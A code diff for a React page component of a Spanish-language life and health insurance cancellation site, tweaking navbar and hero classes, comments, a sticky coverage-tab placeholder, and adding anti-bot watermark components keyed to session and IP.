+            <nav className={`vp-navbar ${openNavbarAbeja && mobile ? 'has-preheader' : ''}`}>
                 <div
                     className="container-max"
                     style={{
@@ -732,9 +910,7 @@ const VistaPrincipal = () => {
                 </div>
             </nav>
 
-            {/* =========================
-                MENÚ MOBILE
-                ========================= */}
+            {/* MENU MOBILE */}
             {mobileOpen && (
                 <div
                     ref={mobileMenuRef}
@@ -929,9 +1105,8 @@ const VistaPrincipal = () => {
 
             <div style={{ background: '#f4f4f4', height: '20px' }}></div>
 
-            {/* 3. HERO SECTION */}
-            <header className="vp-hero">
-                {/* COLUMNA TEXTO */}
+            {/* 3. SECCION CANCELACION SEGURO DE VIDA Y SALUD */}
+            <header className={`vp-hero ${openNavbarAbeja && mobile ? 'has-preheader' : ''}`}>
                 <div className="vp-hero-content">
                     <h1>
                         Cancelación de tu Seguro de Vida y Salud
@@ -967,11 +1142,11 @@ const VistaPrincipal = () => {
                 </div>
             </header>
 
-            {/* 4. TAB DE COBERTURAS */}
-            <div id="bc-bene-start" />
+            {/* placeholder para evitar salto */}
+            <div id="bc-bene-placeholder" className="bc-bene-placeholder" />
 
             {/* 4. TAB DE COBERTURAS */}
-            <div className="bc-bene">
+            <div ref={bcBeneRef} className="bc-bene">
                 <Swiper
                     modules={[Navigation]}
                     className="sticky-contenedor"
@@ -1585,6 +1760,14 @@ const VistaPrincipal = () => {
             <div className="floating-icon">
                 <img src="/assets/images/seguros/atencion.png" alt="Atención al cliente" onClick={() => redirecTo()} />
             </div>
+
+            {/* 🔒 WATERMARK ANTIBOTS / ANTISCREEN */}
+            <Watermark
+                sessionId={watermarkText}
+                ip={ip}
+            />
+
+            <GhostWatermark token={ip} />
         </div >
     );
 };
